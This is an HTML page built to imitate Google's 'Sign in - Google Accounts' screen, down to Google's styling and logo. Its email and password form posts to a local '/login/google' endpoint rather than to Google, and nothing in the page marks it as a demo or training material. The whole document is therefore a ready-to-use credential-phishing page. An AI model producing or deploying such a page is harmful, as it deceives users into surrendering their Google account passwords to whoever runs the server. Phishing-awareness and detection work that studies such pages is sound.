<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            width: 90%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }
        .google-logo {
            max-width: 272px;
            height: auto;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 12px;
            color: #202124;
        }
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
            color: #202124;
        }
        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }
        .form-control {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
        }
        .form-control:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        label {
            display: block;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 8px;
        }
        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 32px;
            transition: background-color 0.2s;
        }
        .btn:hover {
            background-color: #1765cc;
        }
        .footer {
            margin-top: 40px;
            font-size: 14px;
            color: #5f6368;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="/static/images/google.png" alt="Google" class="google-logo" style="width: auto; height: 30px;">
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>

        <form action="/login/google" method="POST">
            <div class="form-group">
                <label for="username">Email or phone</label>
                <input type="text" id="username" name="username" class="form-control" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control" required>
            </div>

            <div style="text-align: left;">
                <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px;">Forgot password?</a>
            </div>

            <button type="submit" class="btn">Sign in</button>
        </form>

        <div class="footer">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <p>Don't have an account? <a href="#">Create account</a></p>
        </div>
    </div>
</body>
</html>
